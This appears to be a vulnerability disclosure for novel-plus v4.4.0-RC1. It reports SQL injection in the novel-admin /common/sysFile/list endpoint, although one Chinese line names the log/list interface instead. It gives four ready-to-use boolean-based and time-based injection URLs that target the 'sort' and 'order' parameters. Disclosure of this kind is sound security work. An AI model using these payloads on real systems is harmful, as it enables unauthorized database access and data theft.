SQL injection vulnerability exists in novel-plus v4.4.0-RC1

novel-plus系统novel-admin子系统common/log/list接口存在SQL注入
The /common/sysFile/list interface of the novel-admin subsystem in the novel-plus system has SQL injection vulnerability.

official website: https://novel.xxyopen.com/index.htm

github: https://github.com/201206030/novel-plus

Affected version: v4.4.0-RC1

releases：https://github.com/201206030/novel-plus/releases/tag/v4.4.0-RC1


Payload:
```
--sort--
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1 AND 7858=(SELECT (CASE WHEN (7858=7858) THEN 7858 ELSE (SELECT 8757 UNION SELECT 2737) END))-- -&order=asc
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1 AND (SELECT 8148 FROM (SELECT(SLEEP(5)))yohp)&order=asc
--order--
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1&order=,1 AND 4354=(SELECT (CASE WHEN (4354=4354) THEN 4354 ELSE (SELECT 8745 UNION SELECT 7606) END))-- - asc
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1&order=,1 AND (SELECT 2800 FROM (SELECT(SLEEP(5)))qQhq) asc
```


